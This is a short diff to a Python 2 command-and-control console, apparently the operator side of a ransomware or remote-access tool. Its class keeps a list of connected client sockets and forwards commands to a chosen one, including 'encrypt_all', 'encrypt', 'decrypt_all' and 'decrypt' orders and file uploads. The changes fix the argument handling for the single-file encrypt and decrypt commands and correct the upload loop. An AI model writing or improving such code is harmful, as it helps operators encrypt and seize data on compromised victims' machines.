@@ -282,7 +282,6 @@ class MC:
 			cls.clients.remove(cls.clients[cls.choice])
 			cls.refresh()
 			cls.FLAG = False
-			#break
 		elif(data != ''):
 			sys.stdout.write(data)
 			nextCmd = raw_input()
@@ -305,14 +304,16 @@ class MC:
 		elif(nextCmd.startswith('encrypt_all')):
 			cls.sendTo(cls.socks[cls.choice], nextCmd)
 		# encrypt single file
-		elif(nextCmd.startswith('encrypt')):
-			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		elif(nextCmd.startswith("encrypt ")):
+			if(len(nextCmd.split(' ')) > 2):
+				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[1])
 		# decrypt all data
 		elif(nextCmd.startswith('decrypt_all')):
 			cls.sendTo(cls.socks[cls.choice], nextCmd)
 		# decrypt single file
-		elif(nextCmd.startswith('decrypt')):
-			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		elif(nextCmd.startswith("decrypt ")):
+			if(len(nextCmd.split(' ')) > 2):
+				cls.sendTo(cls.socks[cls.choice], nextCmd.split(' ')[1])
 		#	any oter strings / commands
 		elif(nextCmd != ''):
 			cls.sendTo(cls.socks[cls.choice], nextCmd)
@@ -362,9 +363,10 @@ class MC:
 		print "Uploading: {} > {}".format(str(lf), str(rf))
 		while True:
 			fd = g.read()
-			if(not fd): break
-			cls.sendTo(sock, fileData)
-			print "File size: {}".format(str(len(fileData)))
+			if(not fd): 
+				break
+			cls.sendTo(sock, fd)
+			print "File size: {}".format(str(len(fd)))
 		g.close()
 		time.sleep(cls.INTERVAL)
 		cls.sendTo(sock, "")
